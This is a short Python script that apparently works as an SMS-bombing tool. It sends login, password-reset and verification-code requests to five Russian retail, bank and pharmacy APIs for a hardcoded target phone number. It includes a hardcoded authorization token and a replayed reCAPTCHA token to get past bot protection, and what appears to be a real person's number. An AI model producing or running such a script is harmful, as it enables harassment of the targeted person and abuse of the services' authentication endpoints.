import requests
import time

# print("Введи номер телефона без кода страны")
# phone=input()
# print("Номер телефона " + phone)
phone = '9223702227'
ts=5
headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
    "Content-Type": "application/json", }

def sunlight():
    sunlightHeaders = headers
    sunlightHeaders.update({"Host": "api.sunlight.net", "Origin": "https://api.sunlight.net"})
    phoneSunlight = "7" + phone
    s = requests.post('https://api.sunlight.net/v3/customers/authorization/', json={"phone": phoneSunlight},
                      headers=sunlightHeaders)
    print(s.status_code)
    print(s.json())


def pyaterka():
    pPhone = "+7" + phone
    pyaterkaHeaders = headers
    pyaterkaHeaders.update({"x-Authorization": "Tokena3133e4dd44f3c7fcaa98d7a9d1f73e44ab656d0", "Host": "5ka.ru",
                            "Origin": "https://5ka.ru"})
    p = requests.post("https://5ka.ru/api/v1/services/phones/add", headers=pyaterkaHeaders, json={"number": pPhone})
    print(p.status_code)
    print(p.json())

def mkb():
    mkbHeaders = headers
    mkbHeaders.update(
        {"host": "my.mkb-am.ru", "Origin": "https://my.mkb-am.ru", "Referer": "https://my.mkb-am.ru/restore-password"})
    mkbPhone = '+7' + phone
    mkb = requests.post('https://my.mkb-am.ru/api/auth/password/reset', headers=mkbHeaders, json={"login": mkbPhone})
    print(mkb.status_code)
    print(mkb.json())


def karusel():
    karHeaders=headers
    karHeaders.update({"Host":"app.karusel.ru", "Origin":"https://karusel.ru"})
    karPhone= "7" + phone
    kar=requests.post("https://app.karusel.ru/api/v2/token/",headers=karHeaders, json={"phone": karPhone,"recaptcha_token":"03AGdBq255xknZF1jMw1N-O4w36uvaeyqFAeYk2x2MhYiDnLs31jnWYboOi1evSLHIrL7JSzXYjesrWMhv5sxvt2hJfEM2N3AXeAKjD135PpocJiEmrYWConWAg2XRGzUZp_rX-FgIoq2Y7qCyBcIdx1CW4KLzh6X_Xk2NvV3-F7L2jynBvXJNmpRL7DBsZZ5xCxLs4JYSfZS4UmPhd0yE-wGIgUtHb4Dz74PSCk61LJg8_bfpB-uo8xoEdgiCg6MeiPPWBjtCqZC_nBF-2zY93Vd64PQd7gAc4aJTd2O7iqGnKEdTPDvUex0B0sI2oHUNJ0m1Ggr0z3C9OWEPtr7l7S3zrgbiH7PZHtWbiuM2Y_VVPxs4aCedXDOWPF1kZ_EuZWYAhCN0iIwGrgJkHPnKl22HfyU149kpK1dTlz_fL_4BeJozTwv0atHwRbjGxYb7youdKp8fJmKe"})
    print(kar.status_code)
    print(kar.json())

def aptekaru():
    aptHeaders=headers
    aptHeaders.update({"Host":"api.apteka.ru","Origin":"https://apteka.ru", "cityId":"5e57803249af4c0001d64407"})
    aptPhone= "+7" + phone
    apt=requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d644070",headers=aptHeaders,json={"phone":aptPhone,"u":"1"})
    print(apt.status_code,"aptekaru")
    print(apt.json())

mkb()
time.sleep(ts)
sunlight()
time.sleep(ts)
pyaterka()
time.sleep(ts)
aptekaru()
time.sleep(ts)
karusel()
